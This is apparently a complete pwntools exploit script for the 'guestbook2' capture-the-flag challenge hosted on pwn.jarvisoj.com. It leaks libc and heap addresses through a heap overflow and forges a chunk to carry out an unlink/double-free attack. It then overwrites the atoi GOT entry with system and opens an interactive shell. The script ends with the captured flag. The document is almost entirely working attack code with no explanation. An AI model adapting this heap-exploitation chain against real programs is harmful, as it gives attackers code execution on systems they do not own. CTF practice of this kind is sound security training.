from pwn import *

local=1
#r=process('./guestbook2',env={"LD_PRELOAD": "./libc.so.6"})
#libc = ELF('libc.so.6')
if local:
	r=process('./guestbook2')
	libc = ELF('libc-2.24_64.so')
	gdb.attach(r)

else:
	host = "pwn.jarvisoj.com"
	port = 9879
	r = remote(host,port)
	libc = ELF('libc.so.6')

def list(no):
	r.sendline("1")


def new(len,content):
	r.sendline("2")
	r.recvuntil(":")
	r.sendline(str(len))
	r.recvuntil(":")
	r.send(content)
	r.recvuntil(":")
	sleep(1)

def edit(no,len,content):
	r.sendline("3")
	r.recvuntil(":")
	r.sendline(str(no))
	r.recvuntil(":")
	r.sendline(str(len))
	r.recvuntil(":")
	r.send(content)
	r.recvuntil(":")
	sleep(1)

def free(no):
	r.sendline("4")
	r.recvuntil(":")
	r.sendline(str(no))
	r.recvuntil(":")

new(0x80,"A"*0x80)#0
new(0x80,"B"*0x80)#1
new(0x80,"C"*0x80)#2

free(1)

edit(0,0x90,("A"*0x80)+("D"*0x10))

#leak libc
r.sendline("1")
r.recvuntil("DDDDDDDDDDDDDDDD")
leak=r.recvuntil("\n")
print leak
print len(leak)
leak=u64(leak[:-1].ljust(8,"\x00"))
#leak=u64(leak[:-1].ljust(8,"\x00"))
print "leaked :"+hex(leak)
free_got=0x0000000000602018
put_got=0x0000000000602020

if local:
	libc_base=leak-3268136-libc.symbols['malloc']
	system=libc_base+libc.symbols['system']
	atoi=libc_base+libc.symbols['atoi']
	print "libc_base : "+hex(libc_base)
	print "system : "+hex(system)
	print "atoi : "+hex(atoi)
	pause()


else:
	a=1

#clean heap
free(0)
free(2)

new(0x80,"A"*0x80)#0
new(0x80,"B"*0x80)#1
new(0x80,"C"*0x80)#2
new(0x80,"D"*0x80)#3
new(0x80,"E"*0x80)#4
free(3)
free(1)
edit(0,0x90,("A"*0x80)+("D"*0x10))

r.sendline("1")
r.recvuntil("DDDDDDDDDDDDDDDD")
leak=r.recvuntil("\n")
print leak
print len(leak)
leak=u64(leak[:-1].ljust(8,"\x00"))
print "leaked heap :"+hex(leak)
heapbase=leak-6608
print "heapbase :"+hex(heapbase)
#free(0)
free(2)
free(4)
edit(0,0x90*8,"\x00"*0x90*8)

free(0)

new(0x80,"A"*0x80)#0
new(0x80,"B"*0x80)#1
new(0x80,"C"*0x80)#2
new(0x80,"D"*0x80)#3
new(0x80,"E"*0x80)#4
free(3)
free(1)

#0x0000000006020A8
atoi_got=0x0000000000602070
known=heapbase+0x30
fake_heap =p64(0)+p64(0x80)+p64(known-0x18)+p64(known-0x10)+"E"*0x60
fake_heap+=p64(0x80) + p64(0x90) + 'F'*0x70
edit(0,(0x80*2),fake_heap)
free(1)
pay = p64(2) + p64(1) + p64(0x100) + p64(known-0x18)
pay += p64(1)+p64(0x8)+p64(atoi_got)
pay += '\x00'*(0x100-len(pay))

#pause()
edit(0,len(pay),pay)
sleep(2)
r.recvuntil(":")

if local==0:
	r.sendline("1")
	r.recvuntil("1. ")
	leak=r.recvuntil("\n")
	print leak
	leak=u64(leak[:-1].ljust(8,"\x00"))
	print "leaked atoi :"+hex(leak)
	libc_base=leak-libc.symbols['atoi']
	print "libc_base : "+hex(libc_base)
	system=libc_base+libc.symbols['system']
	print "system : "+hex(system)


edit(1,8,p64(system))
#pause()
r.sendline("ls -al")
r.interactive()

#PCTF{Double_Fr33_free_Fr3e_Fre3_h4ve_Fun}
